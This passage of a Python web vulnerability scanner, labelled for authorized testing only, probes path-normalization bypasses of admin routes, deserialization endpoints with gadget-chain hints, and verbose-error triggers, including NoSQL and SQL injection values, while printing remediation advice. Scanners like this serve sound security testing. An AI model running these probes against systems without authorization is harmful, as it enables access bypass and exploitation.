                        f"SSRF chain to {chain_name}",
                        url,
                        f"?{param}={target_url[:60]} → indicators: {[i for i in indicators if i.lower() in body.lower()][:2]}",
                        "Block requests to RFC-1918 and link-local ranges; use SSRF-safe HTTP client; "
                        "validate URL scheme (allow only https://); use IMDSv2 on AWS",
                        cvss=9.9, tags=["SSRF", "INFO_DISC", "ADMIN"])
                    return


# ═══════════════════════════════════════════════════════════════════════════════
# 23  PATH NORMALIZATION BYPASS
# ═══════════════════════════════════════════════════════════════════════════════

async def check_path_normalization(s: State):
    base = s.base.rstrip("/")
    tok = {"Authorization": f"Bearer {s.token}"} if s.token else {}

    protected = ["/admin", "/admin/users", "/api/v1/admin", "/api/internal"]
    # Spring %2F bypass, Unicode normalization, dot segments
    bypass_encodings = [
        ("%2F", "/"),          # URL-encoded slash
        ("%252F", "%2F"),      # Double-encoded slash
        ("/..", ""),           # Dot segment
        ("/./", "/"),          # Current dir
        ("%09", "\t"),         # Tab
        ("\x09", "\t"),
        ("%0A", "\n"),
        ("/%20", "/ "),        # Space
        (";", ";"),            # Spring matrix param
        ("%3B", ";"),
        ("..;/", "../"),       # Tomcat bypass
        ("/%2e/", "/./"),      # Encoded dot
        ("/..%2F", "/../"),
    ]
    for path in protected:
        st_base, _, _ = await s.http.get(base + path)
        if st_base not in (401, 403):
            continue
        for enc, _ in bypass_encodings:
            bypass = base + path.replace("/", enc, 1)
            st, body, _ = await s.http.get(bypass, headers=tok)
            if st in (200, 201) and len(body) > 30:
                add(s, "23-PATH-NORM-BYPASS", "HIGH",
                    f"Path normalization bypass: {enc} in {path}",
                    bypass,
                    f"Protected {path} → {st_base}, encoded → {st}",
                    "Normalize paths in middleware before routing; use framework-level path canonicalization",
                    tags=["AUTH_BYPASS", "PATH_TRAVERSAL"])
                return


# ═══════════════════════════════════════════════════════════════════════════════
# 24  INSECURE DESERIALIZATION (gadget chain hints)
# ═══════════════════════════════════════════════════════════════════════════════

async def check_deserialization_advanced(s: State):
    base = s.base.rstrip("/")
    tok = {"Authorization": f"Bearer {s.token}"} if s.token else {}

    # Deserialization endpoints
    deser_paths = [
        "api/v1/session/restore", "api/v1/import",
        "api/v1/job/submit", "api/v1/task",
        "api/v1/state", "api/v1/cache/load",
        "remember-me", "session", "data",
    ]

    # Magic byte probes
    probes = [
        (b"\xac\xed\x00\x05",  "Java serialization magic",       "Java",     "ysoserial gadget chains (CommonsCollections, Spring, Groovy)"),
        (b"\x80\x04\x95",      "Python pickle opcode",           "Python",   "use pickora or manually craft OS command pickle"),
        (b"rO0AB",             "Java base64 serialized (rO0)",   "Java",     "decode base64, deserialize with ysoserial"),
        (b"O:8:",              "PHP object serialization",       "PHP",      "exploit __wakeup/__destruct; use phpggc gadget chains"),
        (b"\x1f\x8b",         "Gzip-compressed serialized data","Java/Ruby","decompress then apply serialization exploit"),
        (b"ACED0005",         "Java serialization hex-encoded",  "Java",     "hex-decode then ysoserial"),
    ]

    for path in deser_paths[:6]:
        url = f"{base}/{path}"
        for magic, label, lang, gadget_hint in probes[:3]:
            st, body, hdrs = await s.http.post(url, data=magic + b"\x00" * 16,
                headers={**tok,
                         "Content-Type": "application/octet-stream"})
            if st in (500, 400) and any(e in body for e in
                                         ["ClassNotFoundException", "InvalidClassException",
                                          "java.lang", "Caused by:", "pickle", "unserialize",
                                          "PHP", "Traceback", "Exception"]):
                add(s, "24-DESER-ACTIVE", "CRITICAL",
                    f"Active deserialization endpoint: {path} ({lang})",
                    url,
                    f"Magic bytes {magic[:4]!r} → {st}: {body[:100]}",
                    f"Gadget hint: {gadget_hint}. "
                    "Replace deserialization with JSON/protobuf; if required, use allowlist of allowed classes",
                    cvss=9.8, tags=["DESERIALIZATION", "INJECTION"])
                return
            if st in (200, 201):
                add(s, "24-DESER-ENDPOINT", "HIGH",
                    f"Deserialization endpoint accepts binary input: {path}",
                    url,
                    f"Binary payload → 200. Test with {gadget_hint}",
                    f"Validate input type; implement allowlist deserialization; "
                    f"test with ysoserial/phpggc/pickora gadget chains",
                    tags=["DESERIALIZATION"])
                return


# ═══════════════════════════════════════════════════════════════════════════════
# 25  INFORMATION DISCLOSURE — ADVANCED
# ═══════════════════════════════════════════════════════════════════════════════

async def check_info_disclosure_advanced(s: State):
    base = s.base.rstrip("/")

    # ── Stack traces / verbose errors ─────────────────────────────────────────
    error_triggers = [
        (base + "/api/v1/users/99999999999999999999", "GET", None),
        (base + "/api/v1/users/undefined", "GET", None),
        (base + "/api/v1/users/null", "GET", None),
        (base + "/api/v1/search?q=" + "A"*10000, "GET", None),
        (base + "/api/v1/users", "POST", {"id": {"$where": "sleep(1)"}}),
        (base + "/api/v1/users/1", "PUT", {"created_at": "not-a-date", "id": "DROP TABLE"}),
    ]
    error_patterns = re.compile(
        r"(stack trace|at [\w$.]+\([\w.]+:\d+\)|"
        r"Traceback \(most recent|"
        r"File \"[^\"]+\", line \d+|"
        r"SyntaxError:|NameError:|TypeError:|"
        r"NullPointerException|ArrayIndexOutOfBounds|"
        r"ORA-\d{5}|SQLSTATE|Warning.*mysql|"
        r"#\d+\s+\w+\s+\([\w/]+\.php:\d+\)|"
        r"Laravel\\|Illuminate\\|symfony|"
        r"Internal Server Error.*\n.*\n.*at\s)",
        re.I | re.S)

    for url, method, body_data in error_triggers:
        if method == "GET":
            st, body, _ = await s.http.get(url)
        else:
            st, body, _ = await s.http.req(method, url, json=body_data,
                headers={"Content-Type": "application/json"})
        if st in (400, 422, 500) and error_patterns.search(body):
            m = error_patterns.search(body)
            add(s, "25-VERBOSE-ERROR", "MEDIUM",
                f"Verbose error / stack trace in response",
                url, f"Status {st}: {m.group(0)[:150]}",
                "Return generic error messages to clients; log details server-side only",
                tags=["INFO_DISC"])
            break

    # ── Source code in responses ───────────────────────────────────────────────
    code_patterns = re.compile(
        r"(def \w+\(|class \w+:|import \w+|from \w+ import|"
        r"function\s+\w+\s*\(|const \w+ =|let \w+ =|"
        r"SELECT .* FROM|INSERT INTO|UPDATE .* SET|"
        r"private static|public class|namespace \w+)",
        re.I)

    for path in ["api/v1/users/error", "api/v1/debug/trace", ".git/HEAD",
                 "phpinfo.php", "_profiler/wdt/", "__debug__/"]:
        st, body, _ = await s.http.get(f"{base}/{path}")
        if st == 200 and code_patterns.search(body) and len(body) > 100:
            add(s, "25-SOURCE-LEAK", "HIGH",
                f"Source code / SQL exposed at /{path}",
                f"{base}/{path}",
                f"Code pattern: {code_patterns.search(body).group(0)[:80]}",
                "Remove debug endpoints from production; restrict .git/ access",
                tags=["INFO_DISC"])
            break


# ═══════════════════════════════════════════════════════════════════════════════
# RUNNER
# ═══════════════════════════════════════════════════════════════════════════════

CHECKS = [
    ("01 Prototype Pollution",          check_prototype_pollution),
    ("02 Web Cache Deception",          check_web_cache_deception),
    ("03 Subdomain Takeover",           check_subdomain_takeover),
    ("04 JWT Advanced",                 check_jwt_advanced),
    ("05 SAML Attacks",                 check_saml_attacks),
    ("06 OAuth Advanced",               check_oauth_advanced),
    ("07 GraphQL Advanced",             check_graphql_advanced),
    ("08 Nginx/Apache Misconfig",       check_nginx_misconfig),
    ("09 Cloud Storage Enum",           check_cloud_storage),
    ("10 Kubernetes Metadata",          check_kubernetes_metadata),
    ("11 API Gateway Bypass",           check_api_gateway_bypass),
    ("12 Parameter Pollution",          check_parameter_pollution),
    ("13 Second-Order Injection",       check_second_order),
    ("14 PostMessage Vulns",            check_postmessage),
    ("15 Dependency Confusion",         check_dependency_confusion),
    ("16 Cookie Security",              check_cookie_security),
    ("17 WebSocket Hijacking",          check_websocket),
    ("18 Business Logic Advanced",      check_business_logic_advanced),
    ("19 DNS Rebinding Surface",        check_dns_rebinding),
    ("20 HTTP/2 h2c Smuggling",         check_h2c_smuggling),
    ("21 Cache Poisoning Advanced",     check_cache_poison_advanced),
    ("22 SSRF Chain",                   check_ssrf_chain),
    ("23 Path Normalization Bypass",    check_path_normalization),
    ("24 Deserialization Advanced",     check_deserialization_advanced),
    ("25 Info Disclosure Advanced",     check_info_disclosure_advanced),
]

SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEV_COLOR = {"CRITICAL": R, "HIGH": Y, "MEDIUM": M, "LOW": B, "INFO": DIM}


async def run_gov_level(base: str, token: str = "", verbose: bool = False,
                        proxy: str = "", concurrency: int = 30,
                        output: str = ""):
    print(f"""
{R}{BOLD}╔══════════════════════════════════════════════════════════════╗
║   GOV-LEVEL VULNERABILITY SCANNER — AUTHORIZED TESTING ONLY ║
║   25 advanced checks beyond OWASP Top 10                     ║
╚══════════════════════════════════════════════════════════════╝{RST}
{Y}Target: {base}{RST}
""")
    conn = aiohttp.TCPConnector(ssl=False, limit=concurrency + 10)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"

    async with aiohttp.ClientSession(connector=conn, headers=headers) as session:
        sem = asyncio.Semaphore(concurrency)
        http = HTTP(session, sem, verbose=verbose)

        parsed = urllib.parse.urlparse(base)
        host = parsed.hostname or base
        host = re.sub(r"^www\.", "", host)

        # Fetch baseline
        st, html, resp_headers = await http.get(base)
        js_urls = [base.rstrip("/") + m.group(1)
                   for m in re.finditer(r'src=["\'](/[^"\']+\.js[^"\']*)["\']', html)]
        js_content = ""
        for js_url in js_urls[:5]:
            _, jsbody, _ = await http.get(js_url)
            js_content += jsbody

        state = State(
            http=http, base=base.rstrip("/"), token=token, host=host,
            html_content=html, js_content=js_content,
            response_headers=resp_headers,
        )

        for name, check_fn in CHECKS:
            print(f"\n{BOLD}{B}[{name}]{RST}")
            try:
                await check_fn(state)
            except Exception as e:
                if verbose:
                    print(f"  {DIM}Error in {name}: {e}{RST}")

    # ── Report ────────────────────────────────────────────────────────────────
    findings = sorted(state.findings, key=lambda f: SEV_ORDER.get(f.severity, 9))
    print(f"\n\n{BOLD}{'═'*68}{RST}")
    print(f"{BOLD}{R}  GOV-LEVEL SCAN RESULTS{RST}")
    print(f"{BOLD}{'═'*68}{RST}\n")

    by_sev = {s: [f for f in findings if f.severity == s] for s in SEV_ORDER}
    for sev, flist in by_sev.items():
        if flist:
            c = SEV_COLOR[sev]
            print(f"{c}{BOLD}{sev}: {len(flist)}{RST}  ", end="")
    print("\n")

    for f in findings:
        c = SEV_COLOR.get(f.severity, W)
        print(f"{c}{BOLD}[{f.severity}]{RST} {BOLD}{f.check}{RST}: {f.title}")
        print(f"  {DIM}URL: {f.url}{RST}")
        if f.evidence:
            print(f"  {DIM}Evidence: {f.evidence[:120]}{RST}")
        print(f"  {DIM}Fix: {f.remediation[:120]}{RST}")
        if f.cve:
            print(f"  {DIM}CVE: {f.cve}  CVSS: {f.cvss}{RST}")
        print()

    if output:
        with open(output, "w") as fh:
            json.dump([{
                "check": f.check, "severity": f.severity,
                "title": f.title, "url": f.url,
                "evidence": f.evidence, "remediation": f.remediation,
                "cve": f.cve, "cvss": f.cvss, "tags": f.tags,
            } for f in findings], fh, indent=2)
        print(f"{G}JSON saved: {output}{RST}")

    return findings


def main():
    ap = argparse.ArgumentParser(
        description="Gov-level advanced vulnerability scanner — authorized testing only")
    ap.add_argument("target")
    ap.add_argument("-t", "--token", default="", help="Bearer token")
    ap.add_argument("-o", "--output", default="", help="JSON output file")
    ap.add_argument("--proxy", default="", help="HTTP proxy")
    ap.add_argument("-c", "--concurrency", type=int, default=30)
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    base = args.target
    if not base.startswith("http"):
        base = "https://" + base

    asyncio.run(run_gov_level(base, token=args.token, verbose=args.verbose,
                               proxy=args.proxy, concurrency=args.concurrency,
                               output=args.output))


if __name__ == "__main__":
    main()
